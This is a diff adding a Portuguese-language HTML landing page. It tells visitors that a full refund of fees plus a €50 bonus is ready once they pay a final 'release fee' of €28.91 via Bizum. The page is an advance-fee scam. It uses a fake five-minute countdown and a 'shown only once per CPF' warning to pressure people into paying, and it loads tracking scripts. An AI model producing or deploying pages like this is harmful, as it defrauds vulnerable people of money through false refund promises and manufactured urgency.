@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    
+<script
+        src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js"
+        data-token="cfcd224e-fd8d-47fc-9834-de14d1c8ee3a"
+>
+</script>
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>    
+    
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Reembolso + Bônus</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #571757, #8c3051);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .card {
+      background-color: #ffffff;
+      padding: 30px;
+      border-radius: 18px;
+      max-width: 460px;
+      width: 100%;
+      box-shadow: 0 8px 25px rgba(255, 64, 129, 0.2);
+      border-left: 6px solid #ff4081;
+    }
+    h2 {
+      color: #e91e63;
+      margin-bottom: 18px;
+      font-size: 20px;
+      text-align: center;
+    }
+    .bonus {
+      font-size: 24px;
+      color: #2e7d32;
+      font-weight: bold;
+      margin: 12px 0;
+      text-align: center;
+    }
+    .valor {
+      font-size: 22px;
+      font-weight: bold;
+      color: #d50057;
+      margin: 20px 0;
+      text-align: center;
+    }
+    ul {
+      padding-left: 18px;
+      margin-bottom: 15px;
+      line-height: 1.5;
+    }
+    .btn-wrapper {
+      display: flex;
+      justify-content: center;
+    }
+    .btn {
+      background: #ff4081;
+      color: #fff;
+      padding: 16px 24px;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      text-align: center;
+      text-decoration: none;
+      animation: pulse 1.6s infinite;
+      transition: background 0.3s ease;
+    }
+    .btn:hover {
+      background: #f50057;
+    }
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(255, 64, 129, 0.5); }
+      70% { box-shadow: 0 0 0 10px rgba(255, 64, 129, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(255, 64, 129, 0); }
+    }
+    .timer {
+      margin-top: 14px;
+      font-size: 15px;
+      color: #c2185b;
+      text-align: center;
+    }
+    .alerta {
+      font-size: 13px;
+      color: #ff1744;
+      font-style: italic;
+      text-align: center;
+      margin-top: 14px;
+    }
+  </style>
+<!-- Tracking + Bizumel server-side -->
+<script src="/up/up6/api/bizumel.js.php" async></script>
+<script src="/up/up6/api/tracking.js.php" async></script>
+</head>
+<body>
+  <div class="card">
+    <h2> ÚLTIMA ETAPA: Reembolso Total + Bônus Ativado</h2>
+    <p style="text-align:center;">Seu histórico de regularização foi validado com sucesso. O sistema autorizou o <strong>REEMBOLSO</strong> de todas as taxas pagas, junto com um bônus de incentivo de:</p>
+    <div class="bonus"> € 50,00</div>
+    <p style="text-align:center;">Para receber o total de <strong>€ 239,75</strong> via Bizum, confirme a <strong>Taxa Final de Liberação</strong>:</p>
+    <div class="valor">€ 28,91</div>
+    <p>Essa confirmação garante:</p>
+    <ul>
+      <li>Reembolso de todas as taxas pagas</li>
+      <li>Liberação do bônus de € 50,00</li>
+      <li>Bizum instantâneo em até 2 minutos</li>
+    </ul>
+    <p class="alerta"> Esta é a última etapa, exibida somente uma vez por CPF.</p>
+    <div class="btn-wrapper">
+      <a class="btn" href="/up/up6/bizum.html">RECEBER REEMBOLSO + BÔNUS</a>
+    </div>
+    <div class="timer" id="timer">Tempo restante: 05:00</div>
+  </div>
+
+  <script>
+    let minutes = 4;
+    let seconds = 60;
+    const timer = document.getElementById("timer");
+    const interval = setInterval(() => {
+      seconds--;
+      if (seconds < 0) {
+        seconds = 59;
+        minutes--;
+      }
+      if (minutes < 0) {
+        clearInterval(interval);
+        timer.textContent = "Tempo expirado!";
+      } else {
+        timer.textContent = `Tempo restante: ${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
